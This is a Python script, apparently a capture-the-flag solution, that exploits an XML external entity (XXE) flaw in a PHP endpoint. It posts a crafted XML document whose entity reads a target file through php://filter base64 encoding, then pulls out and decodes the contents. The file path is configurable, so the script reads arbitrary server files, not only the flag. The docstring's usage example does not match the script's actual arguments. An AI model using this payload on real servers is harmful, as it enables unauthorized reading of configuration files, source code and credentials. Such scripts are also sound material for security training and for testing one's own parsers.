#!/usr/bin/env python3
"""
python3 exploit.py http://localhost:80/process.php flag.txt
 -> Retrieves the flag using php://filter/convert.base64-encode/resource
"""
import argparse
import base64
import re
import requests

def get_flag(url: str, file_path: str) -> None:
    # Build the XML payload with our external entity.
    payload = f'''<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
]>
<root>
  <name></name>
  <tel></tel>
  <email>OUT&xxe;OUT</email>
  <password></password>
</root>
'''
    headers = {"Content-Type": "application/xml"}

    try:
        response = requests.post(url, data=payload, headers=headers, timeout=10)
    except Exception as e:
        print("Error making the request:", e)
        return

    if response.status_code != 200:
        print(f"Non-200 response received: {response.status_code}")
        return

    # Look for our markers. The regex expects a valid base64 string between "OUT" markers.
    match = re.search(r'OUT([A-Za-z0-9+/=]+)OUT', response.text)
    if match:
        encoded_data = match.group(1)
        try:
            flag = base64.b64decode(encoded_data).decode('utf-8')
            print("Flag:", flag)
        except Exception as e:
            print("Error decoding base64 data:", e)
    else:
        print("Failed to extract flag from the response.")
        print("Full response:")
        print(response.text)

def main():
    parser = argparse.ArgumentParser(description="XXE Exploit Script to retrieve the flag")
    parser.add_argument("url", help="Target URL (e.g., http://example.com/process.php)")
    parser.add_argument("--file", default="flag.txt",
                        help="Path to the file to read on the target (default: flag.txt)")
    args = parser.parse_args()

    get_flag(args.url, args.file)

if __name__ == "__main__":
    main()
